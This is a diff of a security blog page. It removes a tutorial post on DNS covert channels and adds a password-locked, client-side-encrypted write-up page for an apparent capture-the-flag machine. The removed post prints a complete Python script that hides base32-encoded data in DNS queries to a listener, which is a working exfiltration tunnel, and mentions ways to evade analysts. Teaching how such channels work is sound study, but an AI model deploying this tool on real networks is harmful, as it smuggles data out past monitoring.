@@ -2,15 +2,16 @@
 <html lang="en">
 
 <head>
+<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
   <meta charset="utf-8">
   <meta http-equiv="X-UA-Compatible" content="IE=edge">
   <meta name="viewport" content="width=device-width, initial-scale=1">
 
-  <title>Overt and Covert channels Part 2</title>
-  <meta name='description' content='This blog is a means to share my research.'>
+  <title>test page windows</title>
+  <meta name="description" content="This blog is a means to share my research.">
 
-  <link rel="canonical" href="http://localhost:4000/new_blog/covert-channel-part-2/">
-  <link rel="alternate" type="application/rss+xml" title="What&#39;s upsecurity" href="/new_blog/feed.xml">
+  <link rel="canonical" href="http://localhost:4000/new_blog/test-encrypt-windows/">
+  <link rel="alternate" type="application/rss+xml" title="What's upsecurity" href="/new_blog/feed.xml">
 
   <!-- Google Font -->
   <link href="https://fonts.googleapis.com/css?family=Nunito:400,700" rel="stylesheet">
@@ -103,7 +104,7 @@
                 
                   
                   
-                  <li class="menu-item"><a href="/new_blog/research-project/" class="menu-link">R&D Project</a></li>
+                  <li class="menu-item"><a href="/new_blog/research-project/" class="menu-link">R&amp;D Project</a></li>
                   
                   
                 
@@ -183,7 +184,27 @@
 </header> <!-- /.header -->
 
 
-      <div class="container">
+      <style>
+	.secret-page-input {
+		border-radius: 30px;
+		padding: 5px;
+	}
+	.secret-page-input-decrypt {
+		background-color: #3E4250;
+		color: #C9D3E7;
+	}
+	.secret-page-input-decrypt:active{
+		background-color: rgba(35,36,39,0.95);
+	}
+	.secret-page-input-decrypt:hover{
+		background-color: rgba(35,36,39,0.95);
+	}
+	.secret-page-input-key {
+		width:70%;
+	}
+
+</style>
+<div class="container">
 	<div class="row">
 		<div class="col col-12">
 			<div class="post-image-box">
@@ -204,11 +225,11 @@
 					
 					<div class="post-tag">
 						
-						<a href="/new_blog/tags#Covert Channel" class="tag">Covert Channel</a>
+						<a href="/new_blog/tags#encrypted%20text" class="tag">encrypted text</a>
 						
 					</div>
 					
-					<h1 class="post-title">Overt and Covert channels Part 2</h1>
+					<h1 class="post-title">test page windows</h1>
 					<div class="post-info">
 						<div class="post-info-author">
 							<div class="info-author-avatar" style="background-image: url(/new_blog/img/me.jpg)"></div>
@@ -217,316 +238,56 @@
 						</div>
 						<div class="post-date">
 							<span>
-								<time datetime="2020-10-29T16:05:55+01:00">Oct 29, 2020</time>
+								<time datetime="2021-04-04T09:05:55+02:00">Apr 04, 2021</time>
 							</span>
 						</div>
 					</div>
 				</div>
 
 				<div class="post-body">
-					<h1 id="overt-and-covert-channels-part-2">Overt and Covert Channels Part 2</h1>
-<p>In part 1 i talked a lot about what (C)overt channels are and how it could be used. In this part i will take one example and show you how it actually looks in detail.</p>
+          <div>  
 
-<p>For this example i use the DNS covert channel as it’s easy to demonstrate and inspect with Wireshark.</p>
-
-<p>I run Wireshark on my loopback interface(localhost) so that it only listens for these messages and not much interference from other software running on my machine.</p>
-
-<p>Note that the script needs to run with sudo rights or else it cannot bind to port 53 (DNS) and then wireshark does not automatically see it as a DNS request. You can run it on another port and decode the packet as DNS but that is not included in this guide.</p>
-
-<p>First we look into DNS Itself before we start to look into how the Covert channel is setup.
-Wireshark shows the bits/bytes mapped to what value so we are going to use that.</p>
-
-<p>To generate a dns packet on the localhost interface i will use the dig command.
-<code class="language-plaintext highlighter-rouge">dig upsecurity.com @localhost</code></p>
-
-<p>Which generates this packet:
-<img src="/new_blog/img/covert-channel/part-2/Clipboard_2020-10-28-15-44-39.png" alt="" /></p>
-
-<p>Because we dont need the additional records we leave that part out.</p>
-
-<p>The packet layout looks like the following:</p>
-
-<table>
-  <thead>
-    <tr>
-      <th>Field</th>
-      <th>Size</th>
-      <th>Description</th>
-    </tr>
-  </thead>
-  <tbody>
-    <tr>
-      <td>Transaction id</td>
-      <td>2 bytes</td>
-      <td>used to pair DNS responses</td>
-    </tr>
-    <tr>
-      <td>Questions</td>
-      <td>2 bytes</td>
-      <td>Used to set message options</td>
-    </tr>
-    <tr>
-      <td>Answer</td>
-      <td>2 bytes</td>
-      <td>The size of the answer options</td>
-    </tr>
-    <tr>
-      <td>Authority</td>
-      <td>2 bytes</td>
-      <td>The size of the authority options</td>
-    </tr>
-    <tr>
-      <td>Additional</td>
-      <td>2 bytes</td>
-      <td>The size of the additional options</td>
-    </tr>
-    <tr>
-      <td>Queries</td>
-      <td>MAX 255 bytes</td>
-      <td>Contains the domain to be resolved</td>
-    </tr>
-  </tbody>
-</table>
-
-<p>The field we are interested in is the queries, because we can put custom data in it.
-The format of the queries field is as follows for the value upsecurity.com:</p>
-
-<table>
-  <thead>
-    <tr>
-      <th>Size</th>
-      <th>Description</th>
-    </tr>
-  </thead>
-  <tbody>
-    <tr>
-      <td>1 byte</td>
-      <td>The length in bytes of upsecurity</td>
-    </tr>
-    <tr>
-      <td>……</td>
-      <td>upsecurity</td>
-    </tr>
-    <tr>
-      <td>1 byte</td>
-      <td>The length in bytes of com</td>
-    </tr>
-    <tr>
-      <td>……</td>
-      <td>com</td>
-    </tr>
-    <tr>
-      <td>1 byte</td>
-      <td>End of the string nullbyte</td>
-    </tr>
-    <tr>
-      <td>2 byte</td>
-      <td>The query type option</td>
-    </tr>
-    <tr>
-      <td>2 byte</td>
-      <td>The query class option</td>
-    </tr>
-  </tbody>
-</table>
-
-<p>So for every subdomain it will put the size then the subdomain until the TLD (Top level domain) is reached.</p>
-
-<h1 id="implement-the-covert-channel-software">Implement the Covert channel software</h1>
-<p>The most basic software uses the TXT record which can return strings directly but this is most often automatically caught by analyzes. Instead i am going to use the FQDN (Fully Qualified Domain Name) directly. To keep the information more obscure and the letters not messing up the URL i will use base32 because RFC 1035 states that a DNS query length is 255 characters total with each subdomain being 63 characters or less. By using Base32 encoding[2], we can encode our data in strings compatible with the DNS requirements: “A-Z”, “0-9” and “-“.</p>
-
-<p>So it will request the ip address of:
-payload.upsecurity.com</p>
-
-<p>I Used pwntools to craft the packets and send and receive them.</p>
-
-<p>Because the rfc defines that we can only use 63 character long subdomains i made them split up if it went over the 63 char threshold and marked the end of the whole packet with a nice smiley.</p>
-
-<div class="language-py highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
-<span class="kn">import</span> <span class="nn">base64</span><span class="p">,</span> <span class="n">socket</span><span class="p">,</span> <span class="n">argparse</span>
-
-<span class="c1"># Static values
-</span><span class="n">p</span> <span class="o">=</span> <span class="n">make_packer</span><span class="p">(</span><span class="mi">16</span><span class="p">,</span><span class="n">endian</span><span class="o">=</span><span class="s">"big"</span><span class="p">,</span><span class="n">sign</span><span class="o">=</span><span class="s">'unsigned'</span><span class="p">)</span>
-<span class="n">packet_flags</span> <span class="o">=</span> <span class="n">p</span><span class="p">(</span><span class="mi">256</span><span class="p">)</span>
-<span class="n">packet_questions</span> <span class="o">=</span> <span class="n">p</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
-<span class="n">packet_answers</span> <span class="o">=</span> <span class="n">p</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
-<span class="n">packet_authorities</span> <span class="o">=</span> <span class="n">p</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
-<span class="n">packet_additional</span> <span class="o">=</span> <span class="n">p</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
-<span class="n">packet_query_type</span> <span class="o">=</span> <span class="n">p</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
-<span class="n">packet_query_class</span> <span class="o">=</span> <span class="n">p</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
-
-
-
-<span class="c1"># Signatures
-</span><span class="n">MessageEndSignature</span> <span class="o">=</span> <span class="s">b"</span><span class="se">\xF0\x9F\x98\x9A</span><span class="s">"</span>
-
-<span class="n">PacketEndSignature</span> <span class="o">=</span> <span class="n">p8</span><span class="p">(</span><span class="mi">10</span><span class="p">)</span>
-<span class="n">PacketEndSignature</span> <span class="o">+=</span> <span class="s">b"upsecurity"</span>
-<span class="n">PacketEndSignature</span> <span class="o">+=</span> <span class="n">p8</span><span class="p">(</span><span class="mi">5</span><span class="p">)</span>
-<span class="n">PacketEndSignature</span> <span class="o">+=</span> <span class="s">b"rocks"</span>
-<span class="n">PacketEndSignature</span> <span class="o">+=</span> <span class="n">p8</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
-<span class="n">PacketEndSignature</span> <span class="o">+=</span> <span class="n">packet_query_type</span> 
-<span class="n">PacketEndSignature</span> <span class="o">+=</span> <span class="n">packet_query_class</span>
-
-<span class="c1"># Mute pwntools loggin
-</span><span class="n">context</span><span class="p">.</span><span class="n">log_level</span> <span class="o">=</span> <span class="mi">100</span>
-
-
-
-<span class="k">def</span> <span class="nf">craft_dns_packets</span><span class="p">(</span><span class="n">data</span><span class="p">):</span>
-    <span class="n">message_id</span> <span class="o">=</span> <span class="mi">1</span>
-    
-
-    <span class="n">packets_to_send</span> <span class="o">=</span> <span class="p">[]</span>
-    
-    <span class="n">encoded_data</span> <span class="o">=</span> <span class="n">base64</span><span class="p">.</span><span class="n">b32encode</span><span class="p">(</span><span class="n">data</span><span class="p">)</span> <span class="o">+</span> <span class="n">MessageEndSignature</span>
-    <span class="n">encoded_data_parts</span> <span class="o">=</span> <span class="p">[</span><span class="n">encoded_data</span><span class="p">[</span><span class="n">i</span><span class="p">:</span><span class="n">i</span> <span class="o">+</span> <span class="mi">63</span><span class="p">]</span> <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="nb">len</span><span class="p">(</span><span class="n">encoded_data</span><span class="p">),</span> <span class="mi">63</span><span class="p">)]</span>
-    
-    <span class="k">for</span> <span class="n">part</span> <span class="ow">in</span> <span class="n">encoded_data_parts</span><span class="p">:</span>
-        <span class="c1"># Form the packet header
-</span>        <span class="n">packet</span> <span class="o">=</span> <span class="n">p</span><span class="p">(</span><span class="n">message_id</span><span class="p">)</span>
-        <span class="n">packet</span> <span class="o">+=</span> <span class="n">packet_flags</span>
-        <span class="n">packet</span> <span class="o">+=</span> <span class="n">packet_questions</span>
-        <span class="n">packet</span> <span class="o">+=</span> <span class="n">packet_answers</span>
-        <span class="n">packet</span> <span class="o">+=</span> <span class="n">packet_authorities</span>
-        <span class="n">packet</span> <span class="o">+=</span> <span class="n">packet_additional</span>
+            <div id="secure-container" style="display: none;">158fcedcd8bcd387658327d59c33ab2367f8e1023c8ceb993a1284d3eafa9c93a334c8e0a3f590bd2c94d62898dda41adb1537b2e8f0a84ffb9e7b0b739a349ea1a225941e636bd8ee3ddaf6314020562c4c6f983ee3c0e0d005dee3359b3c0a37a363b58cd13d5cd5f68955d3474f88fc1d3ebbe41c57a4a9cfe8b4c43d3b163b52cfb69a2e83d30cb35da23515423a4c3af164f0250c7858b982f6d21f38d7d671ffcf0b3685dc53844a649ce5bd1fe820ee336934c36ffb19c9b906061bf4fc5186dee8f4fd4e8f0521101dd58d7279477b1bcdd1d26f8efffbb0d45b632e066eef9f9f8dc7ffd8c7c8dff0ba63c8d620810f03b001ccc62cfda2d21d669486f8e85d5b34b8235c1233bf31f5f9665300e1fb4361be13944502bd5dfcd407d3e4c42f5f3693466f4583ea44c071ff0ab7b7e26dac8be730ff47a3b39cc778b827226ae4e7169029ef60e5fd9c7593a69e82f238a02854e111fcd491534056871a9b047e3e507c720c6d16b99bf4956eef04a62d11c106a1645b772d397b7c3218e47a940447f66a61abbca30aabb36565cfe8f09b0700cd5a1a173a0a3706421bee27b42deac236eaf38953d2c9ae7306242ceb7bfabaefddb7b61462cc775ee8fe315770fcce12cc674901901f4540afec937aecdb23f3fac3609d569cc82b98c6d6c2648ba691bed05d6ccdd47403674b047774d8138230bfb8008082e245b26e05771b06706bed2d83c75fd6f66e0e2b1742e35a94e9a9129d2f414daf13e2a6280d19bae823fbca224c7a12ac2388f05db522f07f6f05a5b299396e65dd6a6dbecad81781083412dc511a8377f210f5f43b3242861e09a7cef428dee890a321455dc7de211b281dc480b844fc3e91c2ece429fad7fb8fe6512a420c4ff688e3ac0e8e1b38942ad3df26cef4d5a73967a520e2da4016ddaa36ca9d21b56e02a9d5c17aab358ae23cad6beac0af4242522b21275379278e10866fce98d96738920db25caf5af889cc15d4f4ceaeced382113395ffc4eb64e467b029d72089d5ef4a9332bb4175cbeca82f47d50d572ee006c5248e42eac159db69be099525ba492c50259e131ac53f19828689402595ea7ca884f2fd4d1598e4585996e19e4bb5099df0b5e589767f4ebd5f6c823ae9e6ffec2718544bb90bdef2e65a6c28e61b9b0f1d71b35482b3ea4ce3c9e71640de64331292cda4944e197313c7cb7ba1dd370f57625d19077acd1db08071e0b554be23f7f12de92605af46a50f0bd29750f28829ebd78eb6e681fc3b308146fc04c7d518f6c5062f7dc56e66dd08466567ffee3f1ae117a95a6f1b41df48ca4b732ca12d6df9aad51acc898b99e00a83d3960a9f97f2a507c3be628eca9d917aaa3da86c76c9406a95d21a23ca57</div>
         
-        <span class="c1"># Add the encoded data.
-</span>        <span class="n">packet</span> <span class="o">+=</span> <span class="n">p8</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">part</span><span class="p">))</span>
-        <span class="n">packet</span> <span class="o">+=</span> <span class="n">part</span>
-        
-        <span class="c1"># Add the .upsecurity.rocks
-</span>        <span class="n">packet</span> <span class="o">+=</span> <span class="n">PacketEndSignature</span>
+            <div id="decryptor">
+				<p>
+					This is an active machine - please enter the password to view this content.<br><br>
+				</p>
+				
+				<p>
+				Write-up’s can be unlocked using the Root hash[Linux] or Administrator password hash [Windows].<br>
 
-        <span class="n">packets_to_send</span><span class="p">.</span><span class="n">append</span><span class="p">(</span><span class="n">packet</span><span class="p">)</span>
-        <span class="n">message_id</span> <span class="o">+=</span> <span class="mi">1</span>
-   
-    <span class="c1"># packet_query
-</span>    <span class="k">return</span> <span class="n">packets_to_send</span>
+				Acceptable Flag Format:<br>
+			
+				Use only the colored encryption section of the hash.<br>
+				
+				
+				Windows:
+				Administrator:500:<strong><u>47E6xxxxxxxx28A9</u></strong>:B71*********92:::
+				
+				</p>
 
-<span class="k">def</span> <span class="nf">main</span><span class="p">():</span>
-    <span class="n">parser</span> <span class="o">=</span> <span class="n">argparse</span><span class="p">.</span><span class="n">ArgumentParser</span><span class="p">(</span><span class="n">description</span><span class="o">=</span><span class="s">'Process args.'</span><span class="p">)</span>
-    <span class="n">parser</span><span class="p">.</span><span class="n">add_argument</span><span class="p">(</span><span class="s">'-t'</span><span class="p">,</span><span class="s">'--dns'</span><span class="p">,</span> <span class="n">help</span><span class="o">=</span><span class="s">'DNS server IP address'</span><span class="p">,</span> <span class="n">required</span><span class="o">=</span><span class="bp">True</span><span class="p">)</span>
-    <span class="n">parser</span><span class="p">.</span><span class="n">add_argument</span><span class="p">(</span><span class="s">'-p'</span><span class="p">,</span><span class="s">'--port'</span><span class="p">,</span> <span class="n">help</span><span class="o">=</span><span class="s">'DNS server port'</span><span class="p">,</span> <span class="n">required</span><span class="o">=</span><span class="bp">True</span><span class="p">)</span>
-    <span class="n">parser</span><span class="p">.</span><span class="n">add_argument</span><span class="p">(</span><span class="s">'-d'</span><span class="p">,</span><span class="s">'--data'</span><span class="p">,</span> <span class="n">help</span><span class="o">=</span><span class="s">'What do you want to extract today?'</span><span class="p">,</span> <span class="n">required</span><span class="o">=</span><span class="bp">False</span><span class="p">)</span>
-    <span class="n">parser</span><span class="p">.</span><span class="n">add_argument</span><span class="p">(</span><span class="s">'-l'</span><span class="p">,</span><span class="s">'--listen'</span><span class="p">,</span> <span class="n">help</span><span class="o">=</span><span class="s">'Listen for incoming requests'</span><span class="p">,</span> <span class="n">required</span><span class="o">=</span><span class="bp">False</span><span class="p">)</span>
-    <span class="n">args</span> <span class="o">=</span> <span class="n">parser</span><span class="p">.</span><span class="n">parse_args</span><span class="p">()</span>
-    <span class="n">dns_ip</span> <span class="o">=</span> <span class="n">args</span><span class="p">.</span><span class="n">dns</span><span class="p">.</span><span class="n">encode</span><span class="p">(</span><span class="s">'utf-8'</span><span class="p">)</span>
-    <span class="n">dns_port</span> <span class="o">=</span> <span class="n">args</span><span class="p">.</span><span class="n">port</span><span class="p">.</span><span class="n">encode</span><span class="p">(</span><span class="s">'utf-8'</span><span class="p">)</span>
-
-    <span class="c1"># The program runs in Server ( listener ) mode.
-</span>    <span class="k">if</span><span class="p">(</span><span class="n">args</span><span class="p">.</span><span class="n">listen</span><span class="p">):</span>
-
-        
-        <span class="c1"># Start to listen on the selected port with udp.
-</span>        <span class="n">l</span> <span class="o">=</span> <span class="n">listen</span><span class="p">(</span><span class="n">port</span><span class="o">=</span><span class="n">dns_port</span><span class="p">,</span> <span class="n">fam</span><span class="o">=</span><span class="s">'ipv4'</span><span class="p">,</span><span class="n">typ</span><span class="o">=</span><span class="s">'udp'</span><span class="p">)</span>
-        <span class="c1"># Because of the size constraint of DNS this buffer will collect every packets data.
-</span>        <span class="n">receivedData</span> <span class="o">=</span> <span class="s">b""</span>
-
-
-        <span class="k">while</span> <span class="bp">True</span><span class="p">:</span>
-            <span class="k">try</span><span class="p">:</span>
-                <span class="c1"># Listen for a packet
-</span>                <span class="n">data</span> <span class="o">=</span> <span class="n">l</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="n">PacketEndSignature</span><span class="p">)</span>
-                <span class="c1"># Strip the DNS information to only keep the message.
-</span>                <span class="n">data</span> <span class="o">=</span> <span class="n">data</span><span class="p">[</span><span class="mi">13</span><span class="p">:(</span><span class="nb">len</span><span class="p">(</span><span class="n">data</span><span class="p">)</span><span class="o">-</span><span class="nb">len</span><span class="p">(</span><span class="n">PacketEndSignature</span><span class="p">))]</span>
-                <span class="c1"># Append the message to the total message buffer.
-</span>                <span class="n">receivedData</span> <span class="o">+=</span> <span class="n">data</span>
-
-                <span class="c1"># If the message delimiter is hit then we decode the message and clear the buffer.
-</span>                <span class="k">if</span><span class="p">(</span><span class="n">MessageEndSignature</span> <span class="ow">in</span> <span class="n">receivedData</span><span class="p">):</span>
-                    <span class="c1"># We strip the end message signature.
-</span>                    <span class="n">encoded_data</span> <span class="o">=</span> <span class="n">receivedData</span><span class="p">[:</span><span class="nb">len</span><span class="p">(</span><span class="n">receivedData</span><span class="p">)</span> <span class="o">-</span> <span class="nb">len</span><span class="p">(</span><span class="n">MessageEndSignature</span><span class="p">)]</span>
-                    <span class="c1"># Decode it and print the received message.
-</span>                    <span class="k">print</span><span class="p">(</span><span class="s">f"Received Message: </span><span class="se">\n</span><span class="si">{</span><span class="n">base64</span><span class="p">.</span><span class="n">b32decode</span><span class="p">(</span><span class="n">encoded_data</span><span class="p">).</span><span class="n">decode</span><span class="p">()</span><span class="si">}</span><span class="se">\n</span><span class="s">"</span><span class="p">)</span>
-                    <span class="c1"># Clear the buffer.
-</span>                    <span class="n">receivedData</span> <span class="o">=</span> <span class="s">b""</span>
-                    <span class="c1"># And start a new listener.
-</span>                    <span class="n">l</span><span class="p">.</span><span class="n">close</span><span class="p">()</span>
-                    <span class="n">l</span> <span class="o">=</span> <span class="n">listen</span><span class="p">(</span><span class="n">port</span><span class="o">=</span><span class="n">dns_port</span><span class="p">,</span> <span class="n">fam</span><span class="o">=</span><span class="s">'ipv4'</span><span class="p">,</span><span class="n">typ</span><span class="o">=</span><span class="s">'udp'</span><span class="p">)</span>
-
-            <span class="k">except</span> <span class="nb">EOFError</span><span class="p">:</span>
-                <span class="c1"># If the program where to throw an End Of File Error (Only in TCP mode) we capture this and start to listen again for new messages.
-</span>                <span class="n">l</span><span class="p">.</span><span class="n">close</span><span class="p">()</span>
-                <span class="n">l</span> <span class="o">=</span> <span class="n">listen</span><span class="p">(</span><span class="n">port</span><span class="o">=</span><span class="n">dns_port</span><span class="p">,</span> <span class="n">fam</span><span class="o">=</span><span class="s">'ipv4'</span><span class="p">,</span><span class="n">typ</span><span class="o">=</span><span class="s">'udp'</span><span class="p">)</span>
-
-                
-
-    <span class="c1"># The program runs in Client ( Sending ) mode.
-</span>    <span class="k">else</span><span class="p">:</span>
-        
-        <span class="n">data</span> <span class="o">=</span> <span class="n">args</span><span class="p">.</span><span class="n">data</span><span class="p">.</span><span class="n">encode</span><span class="p">(</span><span class="s">'utf-8'</span><span class="p">)</span>
-
-        <span class="c1"># Log the message.
-</span>        <span class="k">print</span><span class="p">(</span><span class="s">"Sending: "</span><span class="o">+</span><span class="nb">str</span><span class="p">(</span><span class="n">data</span><span class="p">))</span>
-
-        <span class="c1"># Craft the DNS packets.
-</span>        <span class="n">packets</span> <span class="o">=</span> <span class="n">craft_dns_packets</span><span class="p">(</span><span class="n">data</span><span class="p">)</span>
-        
-        
-        <span class="c1"># Open a udp connection to the server.
-</span>        <span class="n">r</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="n">host</span><span class="o">=</span><span class="n">dns_ip</span><span class="p">,</span> <span class="n">port</span><span class="o">=</span><span class="n">dns_port</span><span class="p">,</span> <span class="n">fam</span><span class="o">=</span><span class="s">"ipv4"</span><span class="p">,</span> <span class="n">typ</span><span class="o">=</span><span class="s">"udp"</span><span class="p">)</span>
-        <span class="c1"># Send every packet.
-</span>        <span class="k">for</span> <span class="n">packet</span> <span class="ow">in</span> <span class="n">packets</span><span class="p">:</span>
-            <span class="n">r</span><span class="p">.</span><span class="n">send</span><span class="p">(</span><span class="n">packet</span><span class="p">)</span>
-        <span class="c1"># Fix for pwntools problem
-</span>        <span class="k">if</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">data</span><span class="p">)</span> <span class="o">&lt;=</span> <span class="mi">63</span><span class="p">):</span>
-            <span class="n">close_connection_packet</span> <span class="o">=</span> <span class="n">craft_dns_packets</span><span class="p">(</span><span class="s">b"close connection"</span><span class="p">)</span>
-            <span class="n">r</span><span class="p">.</span><span class="n">send</span><span class="p">(</span><span class="n">close_connection_packet</span><span class="p">[</span><span class="mi">0</span><span class="p">])</span>
-
-
-        <span class="c1"># close the connection.
-</span>        <span class="n">r</span><span class="p">.</span><span class="n">close</span><span class="p">()</span>
-
-<span class="k">if</span> <span class="n">__name__</span> <span class="o">==</span> <span class="s">"__main__"</span><span class="p">:</span>
-    <span class="n">main</span><span class="p">()</span>
-
-</code></pre></div></div>
-
-<p>I then opened two terminals</p>
-
-<p>Terminal 1: Receiver</p>
-<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">sudo </span>python3 DNSChannel.py <span class="nt">-l</span> 1 <span class="nt">-t</span> localhost <span class="nt">-p</span> 53
-</code></pre></div></div>
-<p>Terminal 2: Transmitter</p>
-<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">sudo </span>python3 DNSChannel.py <span class="nt">-t</span> localhost <span class="nt">-p</span> 53 <span class="nt">-d</span> <span class="s2">"Upsecurity securely transmitted this secret password 'You will never find me'"</span>
-</code></pre></div></div>
-
-<p>Now if we look at terminal 1 we see the response:
-<img src="/new_blog/img/covert-channel/part-2/Clipboard_2020-10-28-16-04-19.png" alt="" /></p>
-
-<p>And if we look at Wireshark we can see the following requests that went over the network:
-<img src="/new_blog/img/covert-channel/part-2/Clipboard_2020-10-28-16-05-19.png" alt="" /></p>
-
-<p>Wireshark marked it as a valid packet and if you would get a lot of packets then this can be missed. Ofcourse wintered security specialists will not fall for this but for that we can play with timing or the transaction id or something. This will take longer but will be more stealthy.</p>
-
-<p>Just to make sure wireshark marks invalid packets as malformed I sent random information over port 53 and you can see that it couldn’t decently parse it:
-<img src="/new_blog/img/covert-channel/part-2/Clipboard_2020-10-28-16-07-57.png" alt="" /></p>
-
-
+              <input id="key" class="secret-page-input secret-page-input-key" type="text" value="">
+              <input id="decrypt" class="secret-page-input secret-page-input-decrypt " type="button" value="Decrypt">
+            </div>
+          </div>
 
 					<div class="post-share">
 						<ul class="share-list list-reset">
 							<li class="share-item">
-								<a class="share-facebook" href="https://www.facebook.com/sharer/sharer.php?u=http://localhost:4000/new_blog/covert-channel-part-2/"
-								onclick="window.open(this.href, 'pop-up', 'left=20,top=20,width=500,height=500,toolbar=1,resizable=0'); return false;"
-								title="Share on Facebook" rel="nofollow">
+								<a class="share-facebook" href="https://www.facebook.com/sharer/sharer.php?u=http://localhost:4000/new_blog/test-encrypt-windows/" onclick="window.open(this.href, 'pop-up', 'left=20,top=20,width=500,height=500,toolbar=1,resizable=0'); return false;" title="Share on Facebook" rel="nofollow">
 									<i class="ion ion-logo-facebook"></i>
 								</a>
 							</li>
 					
 							<li class="share-item">
-								<a class="share-twitter" href="https://twitter.com/intent/tweet?text=Overt%20and%20Covert%20channels%20Part%202&url=http://localhost:4000/new_blog/covert-channel-part-2/"
-								onclick="window.open(this.href, 'pop-up', 'left=20,top=20,width=500,height=500,toolbar=1,resizable=0'); return false;"
-								title="Share on Twitter" rel="nofollow">
+								<a class="share-twitter" href="https://twitter.com/intent/tweet?text=test%20page%20windows&amp;url=http://localhost:4000/new_blog/test-encrypt-windows/" onclick="window.open(this.href, 'pop-up', 'left=20,top=20,width=500,height=500,toolbar=1,resizable=0'); return false;" title="Share on Twitter" rel="nofollow">
 									<i class="ion ion-logo-twitter"></i>
 								</a>
 							</li>
 					
 							<li class="share-item">
-								<a class="share-linkedin" href="https://www.linkedin.com/shareArticle?mini=true&url=http://localhost:4000/new_blog/covert-channel-part-2/&title=Overt%20and%20Covert%20channels%20Part%202&summary=&source=What's%20upsecurity"
-								onclick="window.open(this.href, 'pop-up', 'left=20,top=20,width=500,height=500,toolbar=1,resizable=0'); return false;"
-								title="Share on LinkedIn" rel="nofollow">
+								<a class="share-linkedin" href="https://www.linkedin.com/shareArticle?mini=true&amp;url=http://localhost:4000/new_blog/test-encrypt-windows/&amp;title=test%20page%20windows&amp;summary=&amp;source=What's%20upsecurity" onclick="window.open(this.href, 'pop-up', 'left=20,top=20,width=500,height=500,toolbar=1,resizable=0'); return false;" title="Share on LinkedIn" rel="nofollow">
 									<i class="ion ion-logo-linkedin"></i>
 								</a>
 							</li>
@@ -536,14 +297,16 @@ payload.upsecurity.com</p>
 
 				<div class="post-navigation">
 					
-					<a href="/new_blog/covert-channel-part-1/" class="prev">
-						<div class="post-nav-arrow"><i class="ion ion-ios-arrow-round-back"></i> Previous Article</div>
-						<h2 class="post-nav-title">Overt and Covert channels Part 1</h2>
+					<a href="/new_blog/covidlock/" class="prev">
+						<div class="post-nav-arrow">
+<i class="ion ion-ios-arrow-round-back"></i> Previous Article</div>
+						<h2 class="post-nav-title">CovidLock Ransomware Analysis</h2>
 					</a>
 					 
-					<a href="/new_blog/heap-exploiting-8/" class="next">
-						<div class="post-nav-arrow">Next Article <i class="ion ion-ios-arrow-round-forward"></i></div>
-						<h2 class="post-nav-title">Heap exploiting 8: Info leak & Poison null byte</h2>
+					<a href="/new_blog/test-encrypt/" class="next">
+						<div class="post-nav-arrow">Next Article <i class="ion ion-ios-arrow-round-forward"></i>
+</div>
+						<h2 class="post-nav-title">test page linux</h2>
 					</a>
 					
 				</div>
@@ -613,7 +376,7 @@ payload.upsecurity.com</p>
   
 
   <div class="widget widget-social">
-    <h3 class="widget-title">Subscribe & Follow</h3>
+    <h3 class="widget-title">Subscribe &amp; Follow</h3>
     <ul class="social-profiles list-reset">
       
       <li class="social-profiles-item">
@@ -693,6 +456,59 @@ payload.upsecurity.com</p>
 
 	</div>
 </div>
+
+
+
+
+
+<!-- Fix enter auto submit value. -->
+<script>
+document.getElementById('key')
+  .addEventListener('keyup', function(event) {
+    if (event.code === 'Enter') {
+      event.preventDefault();
+	  document.getElementById('decrypt').click();
+    }
+  });
+</script>
+
+
+<!-- post decryption -->
+<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
+<script type="text/javascript" src="https://cdn.rawgit.com/ricmoo/aes-js/e27b99df/index.js"></script>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/js-sha256/0.9.0/sha256.js"></script>
+<script>
+  var storedEncrypted = '';
+  function decrypt(key) {
+    var text = storedEncrypted;
+    var keyArray = sha256.update(key + _gj.salt).array();
+    var iv = aesjs.utils.hex.toBytes(_gj.iv);
+    var encryptedBytes = aesjs.utils.hex.toBytes(text);
+    var aesCbc = new aesjs.ModeOfOperation.cbc(keyArray, iv);
+    var decryptedBytes = aesCbc.decrypt(encryptedBytes);
+    var final = aesjs.utils.utf8.fromBytes(decryptedBytes);
+
+    if (final.includes("0db9774b86aa5a219a0939cdd5c5aa08")){
+      var text = $($.parseHTML(final)).filter('#0db9774b86aa5a219a0939cdd5c5aa08').html();
+      $('#secure-container').html(text);
+      $('#secure-container').show();
+      $('#decryptor').hide(); 
+    }else{
+      // invalid key
+    }
+    
+       
+  }    
+  $(document).ready(function() {
+    $( "#decrypt" ).click(function() {
+      storedEncrypted = $('#secure-container').text().trim();
+      key =  $('#key').val();
+      decrypt(key);
+    });
+  });   
+</script>
+<div id="crypt_params"><script>var _gj = {salt: '1543fa6cbc6af867',  iv: 'ec9341054eac43a33b019186dbfbfa66' } </script></div>
+<!-- end of post decryption -->
 
   <footer class="footer">
   <div class="container">
